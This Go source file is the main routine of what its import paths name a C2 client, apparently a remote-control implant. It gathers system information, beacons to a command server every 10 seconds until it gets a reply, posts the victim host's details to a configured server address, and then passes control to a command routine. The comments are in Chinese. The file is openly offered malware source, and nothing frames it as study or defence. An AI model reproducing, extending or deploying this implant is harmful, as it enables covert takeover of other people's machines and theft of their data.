package main

import (
	"c2_client_go/cmd"
	"c2_client_go/config"
	"c2_client_go/http"
	"log"
	"time"
)

func main() {
	a, uuid := cmd.GetSysInfo()
	for {
		_,code := cmd.SendMsg(uuid, "Online.js", "Online", "", "")

		if code == 200{
			log.Println("后端服务器连接成功!")
			http.PostData(config.HostAddress+"AddHost.js", a, uuid) //发送主机信息
			cmd.Root(uuid)
			break
		} else {
			log.Println("服务器连接错误,10s后尝试重新连接！")
			time.Sleep(time.Second * 10)
		}
	}

}
